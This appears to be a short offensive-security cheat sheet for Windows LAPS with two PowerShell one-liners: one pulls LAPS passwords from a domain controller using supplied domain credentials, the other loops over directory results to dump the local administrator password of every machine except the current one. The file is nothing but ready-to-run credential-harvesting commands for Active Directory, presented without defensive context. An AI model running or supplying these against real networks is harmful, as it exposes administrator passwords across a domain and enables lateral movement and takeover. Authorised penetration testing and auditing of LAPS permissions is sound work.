# LAPS

% laps, password

## get laps passwords
```
Get-LAPSPasswords -DomainController <ip_dc> -Credential <domain>\<login> | Format-Table -AutoSize
```

## get all machine passwords
```
foreach ($objResult in $colResults){$objComputer = $objResult.Properties; $objComputer.name|where {$objcomputer.name -ne $env:computername}|%{foreach-object {Get-AdmPwdPassword -ComputerName $_}}}
```
